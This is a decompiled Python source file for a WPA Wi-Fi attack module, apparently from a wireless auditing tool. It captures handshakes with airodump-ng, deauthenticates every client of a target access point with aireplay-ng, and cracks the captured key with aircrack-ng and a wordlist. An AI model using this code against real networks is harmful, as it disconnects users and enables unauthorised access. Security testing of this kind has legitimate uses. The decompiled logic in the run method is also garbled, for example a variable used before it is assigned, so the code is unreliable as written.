# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/src/tools/wpa.py
# Compiled at: 2020-01-19 08:17:20
# Size of source mod 2**32: 11121 bytes
import os
from ..handlers.attack import Attack
from ..plugins.aircrack import Aircrack
from ..plugins.airodump import Airodump
from ..plugins.aireplay import Aireplay
from ..config import Configuration
from ..handlers.color import Color
from ..handlers.process import Process
from ..handlers.timer import Timer
from ..handlers.handshake import Handshake
from ..handlers.result import CrackResultWPA
import time, re
from shutil import copy

class AttackWPA(Attack):

    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        """Initiates full WPA handshake capture attack."""
        if Configuration.wps_only:
            if self.target.wps == False:
                Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)
                self.success = False
                return self.success
            else:
                if Configuration.use_pmkid_only:
                    self.success = False
                    return False
                handshake = self.capture_handshake()
                if handshake is None:
                    self.success = False
                    return self.success
                Color.pl('\n{+} analysis of captured handshake file:')
                handshake.analyze()
                if Configuration.wordlist is None:
                    Color.pl('{!} {O}Not cracking handshake because wordlist ({R}--dict{O}) is not set')
                    self.success = False
                    return False
            os.path.exists(Configuration.wordlist) or Color.pl('{!} {O}Not cracking handshake because' + ' wordlist {R}%s{O} was not found' % Configuration.wordlist)
            self.success = False
            return False
        else:
            Color.pl('\n{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with' + ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[(-1)])
            key = Aircrack.crack_handshake(handshake, show_command=False)
            if key is None:
                Color.pl('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % Configuration.wordlist.split(os.sep)[(-1)])
                self.success = False
            else:
                Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
                self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
                self.crack_result.dump()
                self.success = True
            return self.success

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None
        with Airodump(channel=(self.target.channel), target_bssid=(self.target.bssid),
          skip_wps=True,
          output_file_prefix='wpa') as (airodump):
            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)
            self.clients = []
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake
            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA', airodump_target, 'Handshake capture', 'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    time.sleep(step_timer.remaining())
                else:
                    cap_file = cap_files[0]
                    temp_file = Configuration.temp('handshake.cap.bak')
                    copy(cap_file, temp_file)
                    bssid = airodump_target.bssid
                    essid = airodump_target.essid if airodump_target.essid_known else None
                    handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                    if handshake.has_handshake():
                        Color.clear_entire_line()
                        Color.pattack('WPA', airodump_target, 'Handshake capture', '{G}Captured handshake{W}')
                        Color.pl('')
                        break
                    handshake = None
                    os.remove(temp_file)
                    airodump_target = self.wait_for_target(airodump)
                    for client in airodump_target.clients:
                        if client.station not in self.clients:
                            Color.clear_entire_line()
                            Color.pattack('WPA', airodump_target, 'Handshake capture', 'Discovered new client: {G}%s{W}' % client.station)
                            Color.pl('')
                            self.clients.append(client.station)

                    if deauth_timer.ended():
                        self.deauth(airodump_target)
                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                    time.sleep(step_timer.remaining())
                    continue

        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % Configuration.wpa_attack_timeout)
            return handshake
        else:
            self.save_handshake(handshake)
            return handshake

    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return
        else:
            if essid:
                essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
            else:
                essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = '\\d{4}-\\d{2}-\\d{2}T\\d{2}-\\d{2}-\\d{2}'
        get_filename = re.compile('handshake_%s_%s_%s\\.cap' % (
         essid_safe, bssid_safe, date))
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename):
                if re.match(get_filename, filename):
                    return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

    def save_handshake(self, handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)
        else:
            if handshake.essid:
                if type(handshake.essid) is str:
                    essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
            else:
                essid_safe = 'UnknownEssid'
            bssid_safe = handshake.bssid.replace(':', '-')
            date = time.strftime('%Y-%m-%dT%H-%M-%S')
            cap_filename = 'handshake_%s_%s_%s.cap' % (
             essid_safe, bssid_safe, date)
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)
            if Configuration.wpa_strip_handshake:
                Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
                handshake.strip(outfile=cap_filename)
                Color.pl('{G}saved{W}')
            else:
                Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
                copy(handshake.capfile, cap_filename)
                Color.pl('{G}saved{W}')
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return
        for index, client in enumerate([None] + self.clients):
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack('WPA', target, 'Handshake capture', 'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth((target.bssid), client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..handlers.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')

    Configuration.exit_gracefully(0)